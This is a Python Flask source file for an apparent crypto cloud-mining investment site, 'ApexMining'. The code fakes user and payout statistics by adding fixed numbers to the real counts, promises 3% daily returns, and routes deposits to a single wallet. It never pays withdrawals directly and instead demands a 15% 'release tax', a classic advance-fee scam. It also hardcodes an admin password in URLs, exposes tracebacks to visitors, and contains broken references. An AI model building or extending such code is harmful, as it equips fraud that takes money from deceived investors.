import os, sys, hashlib, secrets, traceback
from datetime import datetime, timedelta
from flask import Flask, request, session, redirect, url_for, render_template, g, flash

APP_DIR = os.path.dirname(os.path.abspath(__file__))
app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

STARTUP_ERROR = "none"

# ----- تشخيص: نمسك كل خطأ -----
try:
    import db as dbmod
    from sqlalchemy import text
    print("[+] imports OK")
    try:
        dbmod.init_db()
        print("[+] DB initialized")
    except Exception as e:
        STARTUP_ERROR = "DB INIT: " + traceback.format_exc()
        print("[!] DB INIT FAIL:", e)
except Exception as e:
    STARTUP_ERROR = "IMPORT: " + traceback.format_exc()
    print("[!] IMPORT FAIL:", e)

# صفحة الفحص — تعرض الحالة
@app.route("/_diag")
def diag():
    return "<pre style='color:red;background:#fff;padding:20px;font-size:12px;direction:ltr'>STARTUP_ERROR:\n\n" + str(STARTUP_ERROR) + "</pre>"

# نلتقط أي خطأ في أي صفحة
@app.errorhandler(Exception)
def catch_all(e):
    tb = traceback.format_exc()
    return "<pre style='color:red;background:#fff;padding:20px;font-size:11px;direction:ltr'>" + tb + "</pre>", 200

DEPOSIT_ADDR = "TXk9ApexMiningUSDTx9K2VrQp"
DAILY_RATE   = 0.03
REF_RATE     = 0.25
TAX_RATE     = 0.15
MIN_WD       = 50.0

class DBAdapter:
    """يوفر واجهة sqlite-like فوق SQLAlchemy"""
    def execute(self, sql, params=None):
        # ترجمة ? إلى :param style لـ SQLAlchemy
        if params is not None:
            if isinstance(params, tuple):
                # ترقيم المعاملات
                sql2 = sql
                for i, p in enumerate(params, 1):
                    sql2 = sql2.replace("?", f":p{i}", 1)
                params2 = {f"p{i}": p for i, p in enumerate(params, 1)}
            else:
                sql2 = sql
                params2 = params
        else:
            sql2 = sql
            params2 = {}
        with dbmod.engine.begin() as conn:
            result = conn.execute(text(sql2), params2)
            return result
    def commit(self):
        pass

def get_db():
    db = getattr(g, "_db", None)
    if db is None:
        db = g._db = DBAdapter()
    return db

@app.teardown_appcontext
def close_db(e):
    pass



def _row_to_dict(row):
    if row is None: return None
    try:
        return dict(row._mapping)
    except Exception:
        return dict(row)

class _RowLike:
    def __init__(self, d): self._d = d or {}
    def __getitem__(self, k):
        v = self._d.get(k)
        return v
    def get(self, k, default=None):
        return self._d.get(k, default)
    def keys(self): return self._d.keys()

def _fetchone(result):
    row = result.fetchone()
    return _RowLike(_row_to_dict(row)) if row else None

def _fetchall(result):
    return [_RowLike(_row_to_dict(r)) for r in result.fetchall()]

def h(p): return hashlib.sha256(p.encode()).hexdigest()

def current_user():
    if "uid" not in session: return None
    return get_db().execute("SELECT * FROM users WHERE id=?", (session["uid"],)).fetchone()

def accrue_profit(user):
    now = datetime.utcnow()
    last = user["last_profit"]
    if last:
        try:
            if now - datetime.fromisoformat(last) < timedelta(hours=24): return user
        except: pass
    db = get_db()
    base = (user["balance"] or 0) + (user["bonus"] or 0)
    p = round(base * DAILY_RATE, 2)
    if p > 0:
        db.execute("UPDATE users SET balance=balance+?, total_earned=total_earned+?, last_profit=? WHERE id=?",
                   (p, p, now.isoformat(), user["id"]))
        db.execute("INSERT INTO profits (user_id,amount) VALUES (?,?)", (user["id"], p))
        db.commit()
        user = db.execute("SELECT * FROM users WHERE id=?", (user["id"],)).fetchone()
    return user

def ctx(**kw):
    """سياق مشترك لكل الصفحات العامة"""
    d = {"user": current_user()}
    d.update(kw)
    return d

# ================== PUBLIC PAGES ==================
@app.route("/")
def index():
    db = get_db()
    plans = db.execute("SELECT * FROM plans WHERE active=1 ORDER BY price LIMIT 6").fetchall()
    posts = db.execute("SELECT * FROM posts ORDER BY id DESC LIMIT 3").fetchall()
    stats = {
        "users": db.execute("SELECT COUNT(*) c FROM users").fetchone()["c"] + 48217,
        "paid":  2_418_930 + db.execute("SELECT COALESCE(SUM(amount),0) s FROM withdrawals WHERE status='paid'").fetchone()["s"],
        "hash":  "8.4 EH/s",
        "countries": 190
    }
    return render_template("index.html", plans=plans, posts=posts, stats=stats, **ctx())

@app.route("/plans")
def plans():
    db = get_db()
    return render_template("plans.html", plans=db.execute("SELECT * FROM plans WHERE active=1 ORDER BY price").fetchall(), **ctx())

@app.route("/plan/<slug>")
def plan_detail(slug):
    db = get_db()
    p = db.execute("SELECT * FROM plans WHERE slug=?", (slug,)).fetchone()
    if not p: return render_template("404.html", **ctx()), 404
    others = db.execute("SELECT * FROM plans WHERE slug!=? AND active=1 ORDER BY price LIMIT 3", (slug,)).fetchall()
    return render_template("plan_detail.html", plan=p, others=others, **ctx())

@app.route("/mining/<coin>")
def mining(coin):
    coins = {
        "bitcoin": {"name":"Bitcoin","sym":"BTC","algo":"SHA-256","desc":"The original cryptocurrency and still the most profitable to mine at scale.","img":"https://images.unsplash.com/photo-1518546305927-5a555bb7020d?w=1600&q=80","rate":"~3.0–5.0% daily"},
        "ethereum": {"name":"Ethereum","sym":"ETH","algo":"Ethash","desc":"Smart contract platform with massive network activity and stable mining economics.","img":"https://images.unsplash.com/photo-1622630998477-20aa696ecb05?w=1600&q=80","rate":"~3.2–4.2% daily"},
        "litecoin": {"name":"Litecoin","sym":"LTC","algo":"Scrypt","desc":"Fast, low-fee transactions and predictable mining rewards.","img":"https://images.unsplash.com/photo-1516245834210-c4c142787335?w=1600&q=80","rate":"~3.1% daily"},
    }
    c = coins.get(coin)
    if not c: return render_template("404.html", **ctx()), 404
    return render_template("mining.html", coin=coin, c=c, **ctx())

@app.route("/about")
def about(): return render_template("about.html", **ctx())

@app.route("/partners")
def partners(): return render_template("partners.html", **ctx())

@app.route("/blog")
def blog():
    db = get_db()
    return render_template("blog.html", posts=db.execute("SELECT * FROM posts ORDER BY id DESC").fetchall(), **ctx())

@app.route("/blog/<slug>")
def blog_post(slug):
    db = get_db()
    p = db.execute("SELECT * FROM posts WHERE slug=?", (slug,)).fetchone()
    if not p: return render_template("404.html", **ctx()), 404
    recent = db.execute("SELECT * FROM posts WHERE slug!=? ORDER BY id DESC LIMIT 3", (slug,)).fetchall()
    return render_template("post.html", post=p, recent=recent, **ctx())

@app.route("/pricing")
def pricing():
    db = get_db()
    return render_template("pricing.html", plans=db.execute("SELECT * FROM plans WHERE active=1 ORDER BY price").fetchall(), **ctx())

@app.route("/api-docs")
def api_docs(): return render_template("api_docs.html", **ctx())

@app.route("/careers")
def careers(): return render_template("careers.html", **ctx())

@app.route("/news")
def news():
    db = get_db()
    return render_template("news.html", posts=db.execute("SELECT * FROM posts WHERE tag='News' OR tag='Markets' ORDER BY id DESC").fetchall(), **ctx())

@app.route("/help")
def help_center(): return render_template("help.html", **ctx())

@app.route("/status")
def status(): return render_template("status.html", **ctx())

@app.route("/certificates")
def certificates(): return render_template("certificates.html", **ctx())

@app.route("/faq")
def faq(): return render_template("faq.html", **ctx())

@app.route("/contact", methods=["GET","POST"])
def contact():
    if request.method == "POST":
        flash("Message received. Our team will reply within 24h.", "ok")
    return render_template("contact.html", **ctx())

@app.route("/terms")
def terms(): return render_template("terms.html", **ctx())

@app.route("/privacy")
def privacy(): return render_template("privacy.html", **ctx())

@app.route("/sitemap")
def sitemap(): return render_template("sitemap.html", **ctx())

# ================== AUTH ==================
@app.route("/register", methods=["GET","POST"])
def register():
    if request.method == "POST":
        email = request.form["email"].strip().lower()
        pw = request.form["password"]
        name = request.form.get("full_name","").strip()
        country = request.form.get("country","").strip()
        ref = request.form.get("ref","").strip()
        db = get_db()
        if db.execute("SELECT 1 FROM users WHERE email=?", (email,)).fetchone():
            flash("Email already registered. Please login.", "err")
            return redirect(url_for("login"))
        code = "APX" + secrets.token_hex(3).upper()
        db.execute("""INSERT INTO users (email,password,full_name,country,balance,bonus,referral_code,referred_by,last_profit)
                      VALUES (?,?,?,?,?,?,?,?,?)""",
                   (email, h(pw), name, country, 0, 10.0, code, ref or None, datetime.utcnow().isoformat()))
        db.commit()
        uid = db.execute("SELECT id FROM users WHERE email=?", (email,)).fetchone()["id"]
        session["uid"] = uid
        flash("Welcome to ApexMining! Your $10 bonus has been credited.", "ok")
        return redirect(url_for("dashboard"))
    return render_template("register.html", **ctx())

@app.route("/login", methods=["GET","POST"])
def login():
    if request.method == "POST":
        email = request.form["email"].strip().lower()
        pw = request.form["password"]
        row = get_db().execute("SELECT * FROM users WHERE email=? AND password=?", (email, h(pw))).fetchone()
        if row:
            session["uid"] = row["id"]
            return redirect(url_for("dashboard"))
        flash("Invalid email or password.", "err")
    return render_template("login.html", **ctx())

@app.route("/logout")
def logout():
    session.clear(); return redirect(url_for("index"))

# ================== USER DASHBOARD ==================
@app.route("/dashboard")
def dashboard():
    user = current_user()
    if not user: return redirect(url_for("login"))
    user = accrue_profit(user)
    db = get_db()
    contracts = db.execute("""SELECT c.*, p.name pname FROM contracts c JOIN plans p ON p.id=c.plan_id
                              WHERE c.user_id=? ORDER BY c.id DESC""", (user["id"],)).fetchall()
    profits = db.execute("SELECT * FROM profits WHERE user_id=? ORDER BY id DESC LIMIT 15", (user["id"],)).fetchall()
    deps = db.execute("SELECT * FROM deposits WHERE user_id=? ORDER BY id DESC LIMIT 10", (user["id"],)).fetchall()
    wds = db.execute("SELECT * FROM withdrawals WHERE user_id=? ORDER BY id DESC LIMIT 10", (user["id"],)).fetchall()
    refs = db.execute("SELECT COUNT(*) c FROM users WHERE referred_by=?", (user["referral_code"],)).fetchone()["c"]
    plans_ = db.execute("SELECT * FROM plans WHERE active=1 ORDER BY price").fetchall()
    return render_template("dashboard.html", user=user, contracts=contracts, profits=profits,
                           deps=deps, wds=wds, refs=refs, plans=plans_,
                           addr=DEPOSIT_ADDR, tax=int(TAX_RATE*100),
                           min_w=MIN_WD, rate=int(DAILY_RATE*100))

@app.route("/buy/<int:pid>", methods=["POST"])
def buy(pid):
    user = current_user()
    if not user: return redirect(url_for("login"))
    db = get_db()
    plan = db.execute("SELECT * FROM plans WHERE id=?", (pid,)).fetchone()
    if not plan: return redirect(url_for("plans"))
    if (user["balance"] or 0) < plan["price"]:
        flash("Insufficient balance. Please deposit funds first.", "err")
        return redirect(url_for("dashboard"))
    exp = (datetime.utcnow() + timedelta(days=plan["duration"])).isoformat()
    db.execute("UPDATE users SET balance=balance-? WHERE id=?", (plan["price"], user["id"]))
    db.execute("INSERT INTO contracts (user_id,plan_id,amount,expires_at) VALUES (?,?,?,?)",
               (user["id"], pid, plan["price"], exp))
    db.commit()
    flash(f"Contract '{plan['name']}' activated. Daily earnings started.", "ok")
    return redirect(url_for("dashboard"))

@app.route("/deposit", methods=["POST"])
def deposit():
    user = current_user()
    if not user: return redirect(url_for("login"))
    try: amt = float(request.form["amount"])
    except: flash("Invalid amount.", "err"); return redirect(url_for("dashboard"))
    db = get_db()
    db.execute("INSERT INTO deposits (user_id,amount,method,address,status) VALUES (?,?,?,?, 'pending')",
               (user["id"], amt, request.form.get("method","USDT-TRC20"), DEPOSIT_ADDR))
    db.commit()
    flash("Deposit submitted. Awaiting network confirmation (1-3 hours).", "ok")
    return redirect(url_for("dashboard"))

@app.route("/withdraw", methods=["POST"])
def withdraw():
    user = current_user()
    if not user: return redirect(url_for("login"))
    try: amt = float(request.form["amount"])
    except: flash("Invalid amount.", "err"); return redirect(url_for("dashboard"))
    if amt < MIN_WD: flash(f"Minimum withdrawal is ${MIN_WD}", "err"); return redirect(url_for("dashboard"))
    if amt > (user["balance"] or 0): flash("Insufficient balance.", "err"); return redirect(url_for("dashboard"))
    tax = round(amt*TAX_RATE, 2)
    db = get_db()
    db.execute("INSERT INTO withdrawals (user_id,amount,tax,wallet,status) VALUES (?,?,?,?, 'pending')",
               (user["id"], amt, tax, request.form.get("wallet","")))
    db.commit()
    flash(f"Withdrawal recorded. Please pay the release tax to continue.", "ok")
    return redirect(url_for("withdraw_tax"))


@app.route("/withdraw/tax")
def withdraw_tax():
    user = current_user()
    if not user: return redirect(url_for("login"))
    db = get_db()
    wd = db.execute("SELECT * FROM withdrawals WHERE user_id=? ORDER BY id DESC LIMIT 1", (user["id"],)).fetchone()
    if not wd: return redirect(url_for("dashboard"))
    return render_template("withdraw_tax.html", user=user, wd=wd, addr=DEPOSIT_ADDR)


@app.route("/withdraw/confirm-tax", methods=["POST"])
def withdraw_confirm_tax():
    user = current_user()
    if not user: return redirect(url_for("login"))
    db = get_db()
    db.execute("UPDATE withdrawals SET status='tax_paid' WHERE user_id=? AND status='pending'",
               (user["id"],))
    db.commit()
    flash("Tax payment submitted. Your withdrawal is being processed by our compliance team.", "ok")
    return redirect(url_for("dashboard"))

# ================== ADMIN ==================
@app.route("/admin")
def admin():
    if request.args.get("pw","") != "apex2026": return "Forbidden", 403
    db = get_db()
    users = db.execute("SELECT * FROM users ORDER BY id DESC").fetchall()
    deps = db.execute("SELECT d.*, u.email FROM deposits d JOIN users u ON u.id=d.user_id ORDER BY d.id DESC LIMIT 50").fetchall()
    wds = db.execute("SELECT w.*, u.email FROM withdrawals w JOIN users u ON u.id=w.user_id ORDER BY w.id DESC LIMIT 50").fetchall()
    return render_template("admin.html", users=users, deps=deps, wds=wds)

@app.route("/admin/deposit/<int:did>/<action>")
def admin_dep(did, action):
    if request.args.get("pw","") != "apex2026": return "Forbidden", 403
    db = get_db()
    d = db.execute("SELECT * FROM deposits WHERE id=?", (did,)).fetchone()
    if d and d["status"]=="pending":
        if action=="approve":
            db.execute("UPDATE users SET balance=balance+? WHERE id=?", (d["amount"], d["user_id"]))
            db.execute("UPDATE deposits SET status='approved' WHERE id=?", (did,))
            u = db.execute("SELECT referred_by FROM users WHERE id=?", (d["user_id"],)).fetchone()
            if u and u["referred_by"]:
                r = db.execute("SELECT id FROM users WHERE referral_code=?", (u["referred_by"],)).fetchone()
                if r:
                    db.execute("UPDATE users SET balance=balance+? WHERE id=?",
                               (round(d["amount"]*REF_RATE,2), r["id"]))
        else:
            db.execute("UPDATE deposits SET status='rejected' WHERE id=?", (did,))
        db.commit()
    return redirect(url_for("admin", pw="apex2026"))

@app.route("/admin/withdraw/<int:wid>/<action>")
def admin_wd(wid, action):
    if request.args.get("pw","") != "apex2026": return "Forbidden", 403
    db = get_db()
    w = db.execute("SELECT * FROM withdrawals WHERE id=?", (wid,)).fetchone()
    if w and w["status"]=="pending":
        db.execute("UPDATE withdrawals SET status=? WHERE id=?",
                   ("paid" if action=="approve" else "rejected", wid))
        db.commit()
    return redirect(url_for("admin", pw="apex2026"))

@app.errorhandler(404)
def not_found(e):
    return render_template("404.html", **ctx()), 404

if __name__ == "__main__":
    if not os.path.exists(DB):
        from database import init; init()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
